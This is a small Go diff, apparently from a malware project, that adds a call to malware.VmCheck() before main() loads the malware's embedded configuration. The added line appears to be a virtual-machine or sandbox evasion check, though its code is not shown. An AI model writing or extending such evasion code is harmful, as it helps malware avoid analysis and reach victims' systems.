@@ -10,6 +10,7 @@ import (
 var t string
 
 func main() {
+	malware.VmCheck()
 	config := malware.NewConfig("","","","","","",0)
 	err := config.UnmarshallConfig([]byte(t))
 	if err != nil {
